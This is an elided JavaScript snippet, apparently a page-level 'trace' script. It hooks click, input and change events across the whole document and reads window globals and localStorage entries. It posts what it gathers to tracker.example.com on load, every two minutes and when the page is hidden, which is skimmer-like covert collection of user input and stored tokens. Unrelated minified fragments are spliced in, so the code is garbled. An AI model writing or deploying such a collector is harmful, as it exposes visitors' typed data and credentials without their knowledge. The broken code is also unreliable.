(function (p) {
  const traceKeys = window.tracekeys;
  ...
  function hashGenerator(traceData) {
    let traceKey = Object.keys(traceData).join('');
    let hashCode = 0;
    for (let i = 0; i < traceKey.length; i++) {
      let charCode = traceKey.charCodeAt(i);
  ...
  function interceptEvents() {
    ['click', 'input', 'change'].forEach(evt => {
      document.addEventListener(evt, e => {
        if (e.target) {
          eventHooked[evt] = eventHooked[evt] || [];
          eventHooked[evt].push({
  ...
  function getTraceData() {
    ...
    globalVariables.concat(traceKeys).forEach(key => {
      if (window.hasOwnProperty(key) || localStorage.hasOwnProperty(key)) {
        let item = window[key] || localStorage[key];
  ...
  async function postTraceData(traceData) {
    let hashCode = hashGenerator(traceData);
    const serverEndpoint = 'https://tracker.example.com/api/collection';
    try {
      const fetchResponse = await fetch(serverEndpoint, {
        method: 'POST',
        headers: {
      ...
      if (!fetchResponse.ok) {
        throw new Error('Failed to send data, Status Code:' + fetchResponse.status);
      }
  ...
  let captureAndPostTraceData = () => {
    let traceData = getTraceData();
    if (Object.keys(traceData).length) {
      postTraceData(traceData);
    }
  };
  var i = function (F) {
    if (typeof F != "object") {
  ...
  window.addEventListener('load', () => {
    interceptEvents();
    captureAndPostTraceData();
    setInterval(captureAndPostTraceData, 2 * 60 * 1000);
  });
  function y(D) {
    var E = new f();
    E.putAll(D);
  ...
  window.addEventListener('visibilitychange', () => document.visibilityState === 'hidden' && captureAndPostTraceData());
})(window.dw || {});